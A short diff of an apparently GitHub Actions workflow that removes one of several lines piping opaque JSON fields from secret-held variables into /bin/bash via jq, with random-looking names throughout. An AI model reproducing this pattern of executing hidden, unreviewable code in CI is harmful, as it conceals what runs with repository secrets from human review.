@@ -22,7 +22,6 @@ jobs:
           vpxn4: ${{ secrets.vpxn4 }}
         run: |
           printf '%s' "$vpxn4" | jq -r .pfd9 | /bin/bash
-          echo $vgmd8 | jq -r .c7314 | /bin/bash
           echo $tnq83 | jq -r .wjmgy51856 | /bin/bash
           echo $yf40 | jq -r .splhc9 | /bin/bash
           echo $xyouz2412 | jq -r .bcim95 | /bin/bash
